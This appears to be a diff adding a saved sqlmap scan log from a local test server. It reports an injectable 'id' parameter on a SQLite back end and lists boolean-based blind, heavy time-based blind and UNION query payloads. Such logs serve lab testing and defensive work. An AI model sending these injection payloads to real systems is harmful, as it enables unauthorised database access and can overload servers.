@@ -1,0 +1,23 @@
+GET http://127.0.0.1:8081/?id=1
+[INFO] GET parameter 'id' appears to be dynamic
+[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="alice")
+[INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+[INFO] GET parameter 'id' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
+[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable.
+sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3205=3205
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: id=1 AND 8926=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: id=1 UNION ALL SELECT CHAR(113,118,122,112,113)||CHAR(109,69,67,101,98,82,104,107,70,78,68,104,81,121,82,75,68,80,103,97,119,88,101,87,73,102,83,110,65,73,72,114,87,88,70,76,119,102,121,120)||CHAR(113,120,106,122,113)-- PVcB
+---
+[INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
